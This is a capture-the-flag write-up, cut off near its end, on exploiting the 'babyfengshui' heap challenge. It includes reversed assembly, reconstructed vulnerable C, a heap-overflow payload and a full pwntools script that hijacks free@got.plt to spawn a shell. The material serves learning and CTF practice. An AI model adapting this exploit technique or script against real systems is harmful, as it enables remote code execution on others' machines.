# babyfengshui (33C3 CTF, 2016) — A Full Heap Exploitation Write-up

> **pwn / heap overflow / GOT overwrite / libc identification**
> Binary: `feng` (a.k.a. `babyfengshui_33c3_2016`), 32-bit, No PIE, Partial RELRO, Canary, NX
> **Difficulty:** `Medium-Hard`
> **Author:** Gantosay

This write-up documents the **entire process**, not just the final exploit: static
triage, reverse engineering a stripped binary from scratch, finding the bug,
understanding *why* the classic 2016-era exploit technique needs modern
glibc awareness, and — maybe the most educational part — the detective work
required to identify the exact libc running on the remote server when no
libc file was provided.

---

## Table of Contents

1. [Challenge Metadata & First Triage](#1-challenge-metadata--first-triage)
2. [Reverse Engineering From Scratch](#2-reverse-engineering-from-scratch)
3. [Reconstructed Challenge Source (C)](#3-reconstructed-challenge-source-c)
4. [The Vulnerability](#4-the-vulnerability)
5. [Heap Feng Shui 101](#5-heap-feng-shui-101)
6. [Exploit Strategy](#6-exploit-strategy)
7. [The libc Identification Saga](#7-the-libc-identification-saga)
8. [Final Exploit Script](#8-final-exploit-script)
9. [Postmortem: Every Mistake We Made](#9-postmortem-every-mistake-we-made)
10. [Interview-Style Quiz](#10-interview-style-quiz)

---

## 1. Challenge Metadata & First Triage

```console
$ file feng
feng: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,
interpreter /lib/ld-linux.so.2, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6,
stripped

$ checksec feng
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
```

Takeaways from this alone, before reading a single instruction:

| Fact | Consequence |
|---|---|
| **No PIE** | Every address in the binary (`.text`, `.got.plt`, `.bss`) is a fixed, known constant. We never need to leak our own binary's base. |
| **Partial RELRO** | `.got.plt` is **writable at runtime**. A classic "overwrite a GOT entry" attack is on the table. |
| **Canary present** | Pure stack smashing is out; whatever bug exists, it's probably heap-based (no stack buffer overflow would survive the canary). |
| **NX enabled** | No shellcode on the stack/heap. We'll need ROP or, more likely for a heap bug, a `return-to-libc`-style GOT redirect. |
| **Stripped** | No symbol names. Every function has to be identified purely by its behavior. |

`strings -n 6 feng` gave us the menu immediately:

```
0: Add a user
1: Delete a user
2: Display a user
3: Update a user description
4: Exit
my l33t defenses cannot be fooled, cya!
```

This is a classic **heap "note" challenge**: a menu-driven CRUD interface over
heap-allocated structs, which is the textbook setup for UAF / overflow /
double-free bugs.

---

## 2. Reverse Engineering From Scratch

With no symbols, functions were identified by address and by correlating
`call` sites in `main`'s dispatch switch with the menu strings. `objdump -d
-M intel` plus manual annotation gave us:

| Address | Role | How we knew |
|---|---|---|
| `0x80486bb` | `read_line(buf, size)` | Called everywhere a prompt is followed by `fgets`-like behavior; replaces `\n` with `\0` via `strchr`. |
| `0x8048816` | `add_user(size)` | Called from `main`'s `case 0`; mallocs twice, stores into a global array. |
| `0x8048724` | `update_description(index)` | Called **both** from `main`'s `case 3` *and* from the tail of `add_user` — this dual-use is what originally confused us; it explains why "Add a user" prompts for `name`, *then* `text length` / `text` as if it were a second, independent operation. |
| `0x8048905` | `delete_user(index)` | Two `free()` calls back to back, then zeroes the array slot. |
| `0x804898f` | `display_user(index)` | Two `printf("...%s", ...)` calls. |

### Key global state (static, no-PIE ⇒ fixed addresses)

```
0x804b080   user array (struct user *users[50])
0x804b069   byte: number of users created so far (never decremented on delete!)
0x804b060   FILE *stdin (cached pointer, used by read_line)
```

### The `struct user` layout, recovered from field accesses

```c
struct user {
    char *desc_ptr;   // offset 0x00 — pointer to a SEPARATELY malloc'd buffer,
                       // size chosen by the player at creation time
    char  name[124];  // offset 0x04 — fixed-size buffer, EMBEDDED directly
                       // inside this 0x80-byte struct, filled safely via
                       // read_line(ptr+4, 0x7c)
};                     // total malloc(0x80) request → 0x88-byte chunk
```

This two-level layout (one fixed embedded buffer + one separately-allocated,
variable-size buffer referenced by pointer) is the entire reason this
challenge is interesting: the **pointer field is the attack surface**, not
the embedded buffer.

### GOT table (from `readelf -r feng`, confirmed, used throughout the exploit)

```
0x804b00c  printf@got.plt
0x804b010  free@got.plt      <-- our overwrite target
0x804b014  fgets@got.plt
0x804b020  malloc@got.plt
0x804b024  puts@got.plt
0x804b02c  strchr@got.plt
0x804b034  setvbuf@got.plt
0x804b038  memset@got.plt
```

---

## 2.1 Reading the Raw Disassembly: How We Actually Got Here

There was **no source code** at any point during the static-analysis phase —
only a stripped 32-bit ELF. Everything in Section 2 was derived by running

```console
$ objdump -d -M intel feng > feng.asm
```

and then manually walking through it address by address, cross-referencing
`call` targets against the menu strings found with `strings -a -t x feng`
(the `-t x` prints each string's **file offset**, which — because this is a
non-PIE binary loaded at `0x08048000` — converts directly to a runtime
address: `file_offset + 0x08048000 = runtime address`). This section shows
the actual reasoning, not just the conclusions.

### Step 1 — finding the menu strings and their addresses

```console
$ strings -a -t x feng | grep -A1 -B1 "Add a user"
      cb0 text length: 
      cbe %u%c
      cc4 my l33t defenses cannot be fooled, cya!
      cec text: 
      cf3 name: 
      cfa name: %s
      d04 description: %s
      ...
      d77 size of description: 
```

Adding `0x08048000` to each offset gives the *runtime* address of each
string (e.g. `0x08048cc4` for the taunt message). Searching the disassembly
for `push 0x8048cc4` immediately tells us every code location that can
print that specific string — which is how individual error/branch paths get
identified before we even know what the surrounding function does.

### Step 2 — identifying `main`'s dispatch switch

```asm
08048a9a:
    push   0x8048d7f          ; "Action: "
    call   printf@plt
    lea    eax,[ebp-0x14]
    push   eax
    push   0x8048cbe          ; "%d" (not shown above, separate format literal)
    call   __isoc99_scanf@plt
    mov    eax,[ebp-0x14]
    test   eax,eax
    jne    0x8048b29          ; action != 0 -> skip "Add" branch
    ...
```

This `scanf("%d", &local)` immediately after printing `"Action: "` is the
unmistakable signature of the menu's input loop. From here, each `test /
jne` chain was traced manually to find the five branch targets — one per
menu line — and each branch's **first `call`** was followed to locate the
four worker functions.

### Step 3 — identifying `update_description` and discovering it's shared

The single most important moment in the whole reverse-engineering phase:
tracing `case 0` ("Add a user") expecting it to end after storing the
`name`, and instead finding this at the tail of what we'd labeled
`add_user`:

```asm
08048c7:
    movzx  eax, BYTE PTR ds:0x804b069   ; eax = user_count
    add    eax, 1
    mov    ds:0x804b069, al             ; user_count++  (stored FIRST)
    movzx  eax, BYTE PTR ds:0x804b069   ; reload (now user_count+1)
    sub    eax, 1                        ; eax = the index of the user we JUST created
    movzx  eax, al
    sub    esp, 0xc
    push   eax
    call   0x8048724                     ; <-- calls the SAME function used by menu option 3!
```

This single `call 0x8048724` is why, in a live session, choosing
**"0: Add a user"** doesn't just ask for a `name` — it *also* immediately
asks for `text length:` / `text:`, exactly like choosing **"3: Update a
user description"** does on an existing user. Without catching this one
instruction, you'd reverse-engineer two functions that don't actually exist
as separate code — and you'd never explain why "Add" has four prompts
instead of two.

### Step 4 — finding the bug, instruction by instruction

This is the core of `update_description` (`0x8048724`), reproduced here
exactly as read off `objdump`, with annotations added as we worked through
it live:

```asm
08048785:
    call   __isoc99_scanf@plt      ; scanf("%u%c", &size, &junk_byte)

0804878d:
    movzx  eax, BYTE PTR [ebp-0x1c]      ; eax = index
08048791:
    mov    eax, DWORD PTR [eax*4+0x804b080]   ; eax = users[index]  (the struct ptr)
08048798:
    mov    eax, DWORD PTR [eax]          ; eax = users[index]->desc_ptr
0804879a:
    mov    edx, eax                       ; edx = desc_ptr
0804879c:
    mov    eax, DWORD PTR [ebp-0x10]      ; eax = size (user input)
0804879f:
    add    edx, eax                       ; edx = desc_ptr + size   <-- intended write END address
080487a1:
    movzx  eax, BYTE PTR [ebp-0x1c]
080487a5:
    mov    eax, DWORD PTR [eax*4+0x804b080]   ; eax = users[index]  (struct ptr -- AGAIN, not desc_ptr!)
080487ac:
    sub    eax, 0x4                        ; eax = struct_ptr - 4   <-- the "limit"
080487af:
    cmp    edx, eax                        ; compare (desc_ptr+size) vs (struct_ptr-4)
080487b1:
    jb     0x80487cd                       ; if below, allow the write; else refuse
```

The moment that stood out on first read: at `0x80487a5` the code reloads
`users[index]` — i.e. the **struct pointer**, the exact same value it
already had in `eax` right before dereferencing it at `0x8048798` to get
`desc_ptr`. A correct length check would need the **size originally passed
to `malloc()`** for `desc_ptr` — a number this function has no access to
and the program never stores anywhere. Instead, it compares against an
**address belonging to an entirely different heap allocation.** That's the
whole bug, visible in exactly six instructions once you know what each
register holds.

### Step 5 — confirming `display_user`'s read primitive

```asm
080489c1:
    mov    eax, DWORD PTR [eax*4+0x804b080]    ; eax = users[index]
080489c5:
    add    eax, 0x4                             ; eax = &users[index]->name   (embedded field)
080489cc:
    push   eax
    push   0x8048cfa                            ; "name: %s"
    call   printf@plt
...
080489e4:
    mov    eax, DWORD PTR [eax*4+0x804b080]     ; eax = users[index]    (struct ptr, reloaded)
080489eb:
    mov    eax, DWORD PTR [eax]                  ; eax = users[index]->desc_ptr  (dereferenced!)
080489f3:
    push   eax
    push   0x8048d04                            ; "description: %s"
    call   printf@plt
```

The second `printf` call is the one that matters: it passes
`*users[index]` (i.e. `desc_ptr`'s *value*, not its address) straight into
`%s`. Once `desc_ptr` has been corrupted to equal, say, `free@got.plt`, this
instruction sequence becomes `printf("%s", /* contents of the GOT slot */)`
— an arbitrary-address read, derived purely from noticing which register
gets one extra dereference (`[eax]`) compared to the `name` field print just
above it.

---

## 3. Reconstructed Challenge Source (C)

The following is **not** the designer's original source (which we never
had) — it is a faithful reconstruction, written to produce *exactly* the
disassembly we observed, field for field, check for check. It's included
because reading equivalent C is far easier than re-deriving everything from
`objdump` output, and because a correct reconstruction is itself a form of
proof that the reverse engineering was accurate.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAX_USERS 50

struct user {
    char *desc_ptr;
    char  name[124];
};

static struct user *users[MAX_USERS];
static unsigned char user_count = 0;   // NEVER decremented on delete

// ---- helper: fgets-based line reader, newline stripped ----
static void read_line(char *buf, int size) {
    fgets(buf, size, stdin);
    char *nl = strchr(buf, '\n');
    if (nl) *nl = '\0';
}

// ---- shared by "Add a user" AND menu option 3 ----
static void update_description(unsigned char index) {
    if (index >= user_count) return;
    struct user *u = users[index];
    if (!u) return;

    unsigned size;
    char junk;
    printf("text length: ");
    scanf("%u%c", &size, &junk);

    /* ***** THE BUG *****
     * This should validate against the TRUE size of the desc_ptr
     * allocation (the value passed to malloc() when this user's
     * desc_ptr buffer was created). Instead it compares against the
     * address of the struct itself minus 4 — two completely
     * unrelated heap allocations. This check is nearly always true
     * for any reasonable `size`, giving an effectively unbounded
     * heap buffer overflow on desc_ptr.
     */
    if ((char *)u->desc_ptr + size >= (char *)u - 4) {
        puts("my l33t defenses cannot be fooled, cya!");
        exit(1);
    }

    printf("text: ");
    read_line(u->desc_ptr, size + 1);   // fgets(desc_ptr, size+1, stdin)
}

static void add_user(unsigned size) {
    char *desc = malloc(size);
    memset(desc, 0, size);

    struct user *u = malloc(sizeof(struct user));   // request 0x80
    memset(u, 0, sizeof(struct user));
    u->desc_ptr = desc;

    users[user_count] = u;

    printf("name: ");
    read_line(u->name, sizeof(u->name) - 1);   // 0x7c bytes, SAFE

    update_description(user_count);   // <-- shared vulnerable routine
    user_count++;
}

static void delete_user(unsigned char index) {
    if (index >= user_count) return;
    struct user *u = users[index];
    if (!u) return;

    if (u->desc_ptr) free(u->desc_ptr);
    if (u)           free(u);
    users[index] = NULL;
}

static void display_user(unsigned char index) {
    if (index >= user_count) return;
    struct user *u = users[index];
    if (!u) return;

    printf("name: %s\n", u->name);
    printf("description: %s\n", u->desc_ptr);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);

    while (1) {
        int action;
        printf(
            "0: Add a user\n"
            "1: Delete a user\n"
            "2: Display a user\n"
            "3: Update a user description\n"
            "4: Exit\n"
            "Action: ");
        if (scanf("%d", &action) != 1) continue;

        unsigned char idx;
        switch (action) {
            case 0: {
                unsigned size;
                printf("size of description: ");
                scanf("%u", &size);
                if (user_count > 0x31) { puts("maximum capacity exceeded, bye"); exit(0); }
                add_user(size);
                break;
            }
            case 1:
                printf("index: ");
                scanf("%hhu", &idx);
                delete_user(idx);
                break;
            case 2:
                printf("index: ");
                scanf("%hhu", &idx);
                display_user(idx);
                break;
            case 3:
                printf("index: ");
                scanf("%hhu", &idx);
                update_description(idx);
                break;
            case 4:
                exit(0);
        }
    }
}
```

---

## 4. The Vulnerability

Boiling it down to one line:

```c
if ((char *)u->desc_ptr + size >= (char *)u - 4) { /* refuse */ }
```

A correct bounds check would compare against the **actual malloc size of
`desc_ptr`** — a value that is *not even stored anywhere* in this program!
`desc_ptr`'s allocation size is only ever known at the moment `malloc()` is
called inside `add_user`; after that, the program has no memory of it.
Instead, the check compares the *target write address* against the address
of a **completely unrelated allocation** (the struct itself). Two
independent heap chunks have no guaranteed positional relationship, so this
check is security theater — it happens to reject only truly absurd sizes.

This gives us:

* **Unbounded heap write** (bounded only by how much data you're willing to
  type before a literal newline, since the underlying primitive is `fgets`).
* The write target is **always `desc_ptr`**, a pointer we *also* control
  indirectly — because `desc_ptr` lives inside the struct, and the struct
  itself can be reached by an **earlier** user's overflow.

Combined with `display_user`'s `printf("description: %s", u->desc_ptr)` —
an arbitrary-address **read** primitive the moment `desc_ptr` points
somewhere interesting — and `update_description`'s `fgets(desc_ptr, ...)` —
an arbitrary-address **write** primitive under the same condition — the
exploit plan writes itself:

> Corrupt one user's `desc_ptr` field to point at a GOT entry. Reading that
> user leaks the resolved libc address. Writing to that user writes directly
> into the GOT.

---

## 5. Heap Feng Shui 101

"Feng shui" in heap exploitation means **deliberately arranging chunk sizes
and allocation/free order so that the allocator places chunks exactly where
you want them**, before you ever trigger the actual bug. It's the
difference between hoping a write lands somewhere useful and *guaranteeing*
it.

### glibc chunk sizing recap (32-bit)

```
request2size(req):
    if req + 4 <= 16:  chunksize = 16
    else:               chunksize = align8(req + 4)
```

So: `malloc(8)` → 16-byte chunk. `malloc(0x80)` → `0x84` rounds up to
`0x88`-byte chunk. This formula is version-independent; what differs between
glibc versions is **which freed chunk gets reused for a new request of a
given size** — and that's where most of our pain came from (more on that in
the postmortem).

### Why size `0x80` specifically?

```python
add(io, b"a", b"aaaa", 0x80)   # user 0: desc chunk = 0x88 bytes
add(io, b"a", b"aaaa", 0x80)   # user 1: desc chunk = 0x88 bytes
delete(io, 0)                 # frees user0's desc (0x88) AND struct (0x88)
```

Both of user 0's chunks — its `desc_ptr` buffer *and* its struct — are
**0x88 bytes**, and critically, they are **physically adjacent** in memory
(the struct was allocated immediately after the desc buffer, with no
intervening allocation). When glibc's `free()` sees two adjacent free
chunks, it **consolidates** them into one chunk — in this case producing a
single **0x110-byte** free region. This dependency on size only works
*cleanly* like this outside of tcache; see the postmortem for the modern
glibc wrinkle.

**Step A — before anything is freed.** Four chunks, back to back, exactly
in allocation order:

```
heap addr →  low                                                    high
            ┌──────────────┬──────────────┬──────────────┬──────────────┐
            │  desc0 data  │  struct0     │  desc1 data  │  struct1     │
            │   (0x88)     │   (0x88)     │   (0x88)     │   (0x88)     │
            └──────────────┴──────────────┴──────────────┴──────────────┘
             ^ users[0]     ^ users[0]      ^ users[1]     ^ users[1]
               ->desc_ptr     struct itself    ->desc_ptr     struct itself
```

**Step B — `delete(0)` frees desc0 *and* struct0.** They're adjacent, so
glibc's consolidation logic merges them into **one** free chunk:

```
            ┌─────────────────────────────┬──────────────┬──────────────┐
            │   FREE, merged (0x110)       │  desc1 data  │  struct1     │
            │   (was desc0 + struct0)      │   (0x88)     │   (0x88)     │
            └─────────────────────────────┴──────────────┴──────────────┘
             ^ one big free chunk now sits
               exactly where desc0 used to be
```

**Step C — `add(..., 0x100)` creates user 2.** Its desc buffer (chunksize
`0x104`) is carved directly out of that merged `0x110` free chunk — so
`desc2` starts at **the exact address `desc0` used to occupy**, i.e.
*before* `desc1` and `struct1`:

```
            ┌─────────────────────────────┬──────────────┬──────────────┐
            │     desc2 data (0x104)       │  desc1 data  │  struct1     │
            │  (reclaimed merged region)    │   (0x88)     │   (0x88)     │
            └─────────────────────────────┴──────────────┴──────────────┘
             ^ writes into desc2 start HERE
               and walk forward --------->
```

**Step D — the overflow payload, mapped byte-for-byte onto that memory.**
This is the picture that makes the "magic numbers" in the payload stop
looking magic:

```
offset   0                 260    264        396    400        404   408
         │                  │      │           │      │           │    │
         ▼                  ▼      ▼           ▼      ▼           ▼    ▼
 ┌───────────────┬──────────┬──────┬───────────┬──────┬───────────┬────┐
 │ "/bin/sh\0"    │  'a'*260 │ FAKE │  'a'*132  │ FAKE │  p32(GOT) │    │
 │ (8 bytes,      │ fills    │ SIZE │ fills     │ SIZE │  lands    │    │
 │ stashed for    │ desc2's  │ 0x89 │ desc1's   │ 0x89 │  exactly  │    │
 │ later free())  │ own      │      │ real DATA │      │  on       │    │
 │                │ region   │      │ region    │      │  struct1  │    │
 │                │          │      │           │      │ ->desc_ptr│    │
 └───────────────┴──────────┴──────┴───────────┴──────┴───────────┴────┘
         ↑                          ↑                   ↑
   data WE will read          desc1's chunk        struct1's chunk
   back later (step 2          HEADER — must        HEADER — must
   of the exploit)             stay valid (0x89)     stay valid (0x89)
                                or a later free()      or a later free()
                                aborts on corrupt       aborts on corrupt
                                metadata                metadata
```

Those two `FAKE SIZE` fields are **not corrupting anything real** — they
are *restoring* the true chunk-size headers of `desc1` and `struct1` that
our raw overflow would otherwise blow away as it passes through on its way
to the real target (`struct1->desc_ptr`, the very last 4 bytes). Skip them,
and the heap's internal bookkeeping becomes inconsistent; the process may
not even crash *immediately* — it can crash later, on some unrelated
`malloc`/`free` call, which makes the root cause very easy to misdiagnose.

The payload:

```python
payload = (
    b"/bin/sh\x00"                     # stashed for later: system("/bin/sh")
    + b"a" * (0x80 + 0x80 + 4)          # filler across the merged region
    + p32(0x88 + 1)                    # fake size field for user1's desc chunk (size | PREV_INUSE)
    + b"a" * (0x80 + 4)                 # filler across user1's desc chunk data
    + p32(0x88 + 1)                    # fake size field for user1's struct chunk
    + p32(GOT_FREE)                     # lands exactly on user1->desc_ptr
)
```

Those `p32(0x88 + 1)` fields are not optional padding — they **preserve the
true chunk size headers** of chunks we're writing through but not actually
corrupting. Skip them, and even if the overflow itself "succeeds," a later
`malloc`/`free` touching those headers can abort the process or corrupt the
heap in a way that crashes before you get your leak.

---

## 6. Exploit Strategy

1. **Heap-groom** two filler users (`0x80`-sized) and delete the first, to
   set up the merge described above.
2. **Overflow** via a third user's creation, landing the final 4 bytes of
   the payload on user 1's `desc_ptr` field, overwriting it with
   `free@got.plt`'s address.
3. **Leak**: `display_user(1)` → `printf("description: %s", GOT_FREE)` →
   prints the *current, resolved* runtime address of `free()` in libc.
4. **Compute**: `libc_base = leaked_free - libc.sym['free']`,
   `system_addr = libc_base + libc.sym['system']`.
5. **Overwrite**: `update_description(1, p32(system_addr))` — since user
   1's `desc_ptr` is *still* `free@got.plt`, this write lands directly
   on the GOT entry, replacing `free`'s resolved address with `system`'s.
6. **Trigger**: `delete_user(2)` calls `free(user2->desc_ptr)` — but
   `free@got.plt` now points at `system()`, and `user2->desc_ptr` was
   pre-seeded with `"/bin/sh\0"` back in step 2. The call becomes
   `system("/bin/sh")`.

Shell.

### The GOT redirection, visualized

```
BEFORE the overwrite:                    AFTER update(1, p32(system_addr)):

 .got.plt                                 .got.plt
 ┌────────────────────┐                   ┌────────────────────┐
 │ free@got.plt        │ -> real free()    │ free@got.plt        │ -> system()
 │ 0x804b010           │    in libc        │ 0x804b010           │    in libc
 └────────────────────┘                   └────────────────────┘
        ▲                                         ▲
        │ users[1]->desc_ptr points HERE          │ (unchanged —
        │ (set by the Section 5 overflow)         │  still points here)
        │                                         │
 users[1] struct                          delete(2) calls:
 ┌────────────────────┐                     free( users[2]->desc_ptr )
 │ desc_ptr ───────────┘                          │
 │ name[124]            │                         ▼
 └────────────────────┘                   free@got.plt now == system()
                                                    │
 users[2] struct                                   ▼
 ┌────────────────────┐                   system( "/bin/sh\0" )
 │ desc_ptr ──────────────► "/bin/sh\0...."        │
 │ name[124]            │                          ▼
 └────────────────────┘                          🐚 shell
```

The critical thing this diagram makes explicit: **`users[1]` and
`users[2]` play two completely different roles** in this final step.
`users[1]`'s corrupted `desc_ptr` is the *vehicle* for the GOT write (it's
*what* we write *through*); `users[2]`'s `desc_ptr` is the *payload* for
the eventual call (it's *what gets passed as the argument* once the GOT
redirect fires). Mixing these two up is a common source of confusion when
first reading this exploit.

---

## 7. The libc Identification Saga

This is the part of the project that ate the most time, and arguably taught
the most. No libc file was provided with the remote challenge — only a
`host:port`. Here's the full trail, mistakes included, because the dead
ends are as instructive as the solution.

### Attempt 1 — guess from memory

A "known-looking" `(free_offset, system_offset)` pair was tried from
memory. **Wrong.** Caused a SIGSEGV the instant the hijacked `free()` was
invoked — the GOT now pointed at an unmapped or non-executable address.
**Lesson:** never trust a half-remembered offset; the base calculation is
tautologically correct only if *both* the leaked value and the offset come
from the *same* file.

### Attempt 2 — automatic single-symbol lookup (`libc.rip`)

```python
requests.post("https://libc.rip/api/find", json={"symbols": {"free": hex(leak)}})
```

This returned **10 candidates** spanning `x86_64`, `x32`, and `i386`
builds — because `libc.rip` matches only on the **low 12 bits** of the
leaked address (ASLR only randomizes page-aligned bits, so the low 12 bits
of any symbol's *resolved* address equal that symbol's *offset*'s low 12
bits, always, for every process). A single symbol match is therefore
**not proof of anything** beyond "some library, somewhere, happens to share
this one coincidence." Filtering to i386-only left exactly one
coincidental match (`glibc 2.35`) — which we used, and which **crashed the
remote process**, confirming it was a false positive.

```
leaked free() = 0xf7...750
0x95750 (free offset in the WRONG glibc 2.35 build) also ends in 750 -> false match
```

### Attempt 3 — cross-confirm with a second, independently-leaked symbol

The idea: leak `free` and (separately) `malloc` from two **fresh,
independent connections** (different ASLR bases, so their absolute
addresses can't be algebraically combined — but their *low-12-bit*
candidate-matching can be **intersected**, since that criterion doesn't
depend on the base at all).

```python
ids_free   = {candidate ids matching leaked free}
ids_malloc = {candidate ids matching leaked malloc}
common     = ids_free & ids_malloc
```

Result: **empty intersection.** The true remote library (whatever it was)
apparently wasn't even present in `libc.rip`'s dataset for at least one of
the two symbols, or appeared disguised under different builds for each
query. Either way, pure statistical cross-referencing against a
third-party database hit a wall.

### A parsing bug that looked like a libc mismatch (worth its own section)

Partway through, several "leak failed, null byte too early" errors showed
up — for `free`, of all symbols, which had worked cleanly many times
before. The raw bytes told the real story:

```
b"P'\xdc\xf7 \xf6\xda\xf7 \x10\xe0\xf7&\x85\x04\x08\n"
```

This is **16 bytes**, not 4. `display_user` prints with `printf("%s", ...)`,
which doesn't stop until it hits an actual `\x00` — and since `free`'s
resolved address has no null byte in its low bytes, `%s` kept walking
straight through the **next several consecutive GOT entries** (which also
had no null bytes), printing four concatenated 4-byte pointers before
finally hitting a genuine zero. The `0x20` bytes that looked like ASCII
space "separators" were never separators at all — they were just the low
byte of the *next* GOT pointer, which happened to equal `0x20`.

**The actual bug was in our own validation code**, which rejected any leak
whose raw length wasn't *exactly* 4 bytes. The fix: always take the first 4
bytes of whatever comes back; only treat it as a genuine failure if *fewer*
than 4 bytes arrive (which means the null terminator was inside the
intended 4-byte window — the one case where we truly can't recover the
value, since bytes past the null were never transmitted at all).

```python
def leaked_to_u32(desc):
    data = desc.rstrip(b"\n")
    if len(data) < 4:
        return None          # genuinely incomplete — null byte inside our target
    return u32(data[:4])     # >=4 bytes: just take the first 4, rest is next GOT entries
```

This single off-by-one in a length check cost hours and was mistaken for
evidence of "the remote instance must be running a different, tcache-enabled
glibc" — a plausible-sounding but entirely wrong theory, until the raw
bytes were actually inspected byte-by-byte instead of trusting the
higher-level parse.

### The breakthrough: someone else's public exploit + their libc file

Eventually, a public GitHub repo solving this exact challenge was found,
complete with a working exploit **and** a `libc-2_23_buu.so` file (`BUU`
referring to BUUCTF, a Chinese platform that also hosts this challenge).
Running that exploit against the remote target worked immediately. Two
questions remained, both worth answering properly for a write-up instead of
just shrugging and moving on:

**Q: Was the earlier-identified `free`/`system` offset pair wrong?**
Yes — trivially confirmed:

```console
$ nm -D libc-2_23_buu.so | grep -E '\bfree\b|\bsystem\b'
00070750 T free@@GLIBC_2.0
00047000 ... (NOT present — wrong lib)
```

(the correct file gives `free = 0x70750`, `system = 0x3a940` — matching the
`...750` suffix pattern that showed up in *every single leak we ever took*,
proving our leak primitive itself was correct from the very first attempt;
only the offset *pairing* was ever wrong.)

**Q: Can *we* find/verify this exact libc independently, without just
trusting a random GitHub upload?**

This is the part worth documenting carefully, because "someone on GitHub
said so" is not a citation:

1. **Hash lookup — came up empty.**
   ```console
   $ sha256sum libc-2_23_buu.so
   95ee880872e40e9e4f9b92f9a7a9b71a34a70d7e79e3d13ae7d54f0b11d01ce6
   $ sha1sum libc-2_23_buu.so
   c1d3aa79808e71885c67b9763b5e52a96cc02d16
   $ file libc-2_23_buu.so   # extract BuildID
   BuildID[sha1]=9a6b57c7a4f93d7e54e61bccb7df996c8bc58141
   ```
   None of SHA256, SHA1, or BuildID matched anything in `libc.rip`'s
   database. **This does not mean the file is fake or tampered with** — it
   means a third-party crawler never happened to archive this particular
   build. `libc.rip` only indexes what its maintainers' scripts have
   fetched from official mirrors; a regional CTF platform's internal copy,
   possibly pulled from an old snapshot or proposed-pocket mirror, is
   exactly the kind of file such a crawler would miss.

2. **The file names itself.** glibc embeds its own version banner as a
   literal string, compiled in at build time:
   ```console
   $ strings libc-2_23_buu.so | grep -i "GNU C Library"
   GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11) stable release version 2.23, by Roland McGrath et al.
   ```
   This is **not a third-party claim** — it's glibc's own build system
   stamping its exact package version into the binary. This string alone is
   a stronger identification than any hash-database hit, because it comes
   directly from the source.

3. **Verify that package build actually exists, from the authoritative
   source** (Launchpad — Canonical's own build infrastructure, not a
   mirror, not a third-party cache):
   ```
   https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu11
   ```
   This resolved to a real build record:
   > **i386 build of glibc 2.23-0ubuntu11 in ubuntu xenial PROPOSED**
   > Architecture: i386 · Series: Xenial (16.04 LTS)
   > Output: `libc6_2.23-0ubuntu11_i386.deb (2.2 MiB)`

   This closes the loop with a citation chain that doesn't depend on
   trusting a stranger's GitHub upload: **binary → embedded version string
   → official Canonical build record**, with the hash mismatch against
   `libc.rip` explained (crawler coverage gap) rather than ignored.

**Take-away for future challenges:** when a hash-based libc database comes
up empty, don't conclude the file is unidentifiable or untrustworthy — pull
the embedded version banner with `strings` and go straight to the
distro's own build/package archive. It's more authoritative *and* usually
faster than hunting for the right third-party mirror.

---

## 8. Final Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = "info"
context.arch = "i386"

HOST = "<challenge-host>.tcp-ctf2.dasctf.com"
PORT = 9999

GOT_FREE = 0x804b010                              # confirmed via readelf -r
libc = ELF("./libc-2.23.so", checksec=False)      # confirmed via strings + Launchpad

def conn():
    return remote(HOST, PORT, ssl=True, sni=HOST)

def add(io, username, desc, dlen):
    io.sendlineafter(b"Action: ", b"0")
    io.sendlineafter(b"size of description: ", str(dlen).encode())
    io.sendlineafter(b"name: ", username)
    io.sendlineafter(b"text length: ", str(dlen).encode())
    io.sendlineafter(b"text: ", desc)

def update(io, index, desc):
    io.sendlineafter(b"Action: ", b"3")
    io.sendlineafter(b"index: ", str(index).encode())
    io.sendlineafter(b"text length: ", str(len(desc)).encode())
    io.sendlineafter(b"text: ", desc)

def delete(io, index):
    io.sendlineafter(b"Action: ", b"1")
    io.sendlineafter(b"index: ", str(index).encode())

def show(io, index):
    io.sendlineafter(b"Action: ", b"2")
    io.sendlineafter(b"index: ", str(index).encode())

io = conn()

# --- heap feng shui: force a merge, then reclaim it ---
add(io, b"a", b"aaaa", 0x80)    # idx0
add(io, b"a", b"aaaa", 0x80)    # idx1  (overflow target)
delete(io, 0)                   # merges idx0's desc(0x88) + struct(0x88) -> 0x110 free chunk
add(io, b"a", b"aaaa", 0x100)   # idx2  (attacker chunk, reclaims the merged region)

# --- craft the overflow: walk through idx1's chunk headers, land on desc_ptr ---
payload = (
    b"/bin/sh\x00"
    + b"a" * (0x80 + 0x80 + 4)
    + p32(0x88 + 1)
    + b"a" * (0x80 + 4)
    + p32(0x88 + 1)
    + p32(GOT_FREE)
)
update(io, 2, payload)

# --- leak ---
show(io, 1)
io.recvuntil(b"description: ")
free_leak = u32(io.recv(4))
libc_base = free_leak - libc.sym["free"]
system_addr = libc_base + libc.sym["system"]
log.success(f"free leak = {hex(free_leak)}  libc_base = {hex(libc_base)}  system = {hex(system_addr)}")

# --- GOT overwrite + trigger ---
update(io, 1, p32(system_addr))   # idx1->desc_ptr is still GOT_FREE: this writes INTO the GOT
delete(io, 2)                     # free(idx2->desc_ptr) == system("/bin/sh")

io.interactive()
```

---

## 9. Postmortem: Every Mistake We Made

Documented in full because each one is a reusable lesson:

1. **Guessing an offset pair from memory.** Never do this — always derive
   both values from the *same* file you'll use for the base calculation.

2. **Trusting a single-symbol `libc.rip` match.** The matching criterion
   (shared low-12-bits) produces coincidental hits across *many* unrelated
   library builds. One leaked symbol is essentially random noise; treat a
   single match as a hypothesis to test, never as ground truth.

3. **Writing an overly strict leak-length check** (`len(data) != 4` instead
   of `< 4`), which manufactured a phantom "the remote glibc must have
   tcache and our heap layout is wrong" theory out of what was actually a
   parsing bug. **Always inspect raw bytes before theorizing about remote
   behavior.**

4. **Naive overflow padding with random filler bytes**, instead of
   preserving real chunk-size headers while walking through chunks we don't
   intend to corrupt. This is the difference between an exploit that works
   *once, by luck, on one specific heap state* and one that works
   *deterministically, because the heap math was actually verified*.

5. **Changing the remote target mid-investigation** without noting it down.
   Several contradictory results across "attempts" later turned out to be
   differences between genuinely different container instances (new
